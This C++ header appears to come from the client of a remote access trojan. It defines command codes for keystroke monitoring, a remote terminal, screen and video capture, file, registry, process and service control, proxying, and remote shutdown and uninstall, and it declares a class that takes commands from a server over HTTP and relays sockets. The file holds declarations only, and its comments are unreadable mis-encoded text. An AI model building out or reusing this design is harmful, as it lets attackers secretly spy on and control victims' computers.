#pragma once


//���״���
#define CLIENT_SYSTEM_RESTART	1020				//�����ͻ�����
#define CLIENT_SYSTEM_SHUTDOWN	1021				//�رտͻ�����
#define CLIENT_PRO_UNINSTALL	1022				//ж�ؿͻ�����
#define CLIENT_MODIFY_INFO		1023				//���Ŀͻ���Ϣ
#define CLIENT_LOGIN_SUCCESS	1024				//ǩ���ɹ�
#define CLIENT_FRAME_START		1028				//��ʼ��Ļ����
#define CLIENT_FILES_START		1029				//��ʼ��������
#define CLIENT_KEYMON_START		1032				//��ʼ���̼��
#define CLIENT_TLNT_START		1033				//��ʼ�����ն�
#define CLIENT_REGEDIT_START	1034				//��ʼע������
#define CLIENT_PROC_START		1035				//��ʼ���̹���
#define CLIENT_SERVICE_START	1036				//��ʼ�������
#define CLIENT_MULIT_START		1037				//��ʼ����Ƶ����
#define CLIENT_PROXY			1038				//��ʼ�������

typedef struct _CMDINFO_
{
	UINT m_Command;				//��������
	UINT m_DataLen;				//���ݳ���
}CMDINFO,*LPCMDINFO;

typedef struct _SOCKETDATA_
{
	SOCKET	m_LocalSocket;
	SOCKET	m_RemotSocket;
	BOOL	m_IsRecv;
}SOCKETDATA,*LPSOCKETDATA;

typedef struct _SOCKEINFO_
{
	char	m_DesAddr[30];
	UINT	m_DesPort;
	UINT	m_LocalPort;
	SOCKET	m_soListen;
}SOCKEINFO,*LPSOCKEINFO;

class CMyMainTrans
{
public:
	CMyMainTrans(void);
	~CMyMainTrans(void);

	void DoWork(HINTERNET HttpFp , HANDLE hExitEvent ,char* pServerAddr , 
				int nServerPort ,char* pRegInfo ,char* pFileName);

private:

	HINTERNET hFp;
	char	m_ServerAddr[256];
	UINT	m_ServerPort;
	HANDLE	m_ExitEvent;
	char	m_RegInfo[256];
	char	m_FileName[256];
	UINT	m_WorkType;
	

	BOOL ProcessCmd();
	void ShutDownSystem(BOOL Flag);
	void MyRegDeleteKey(char *ValueName);
	void StartClientCtrl(int iType);
	BOOL RecvData(HINTERNET hFile,LPVOID pData,int DataLen);
	void SendTlntCmd(HINTERNET hFp , int nLen);

	static void TransSocket(SOCKET m_Sendsocket,SOCKET m_RecvSocket);
	static SOCKET GetConnectSocket(char* pServerAddr, UINT nServerPort);
	SOCKET StartTcp(WORD Port);

	static void SSH_CtrlThread(LPVOID lPvoid);
	static void MainThread(LPVOID lPvoid);
	static void ListenThread(LPVOID lPvoid);
	static void WorkThread(LPVOID lPvoid);
};
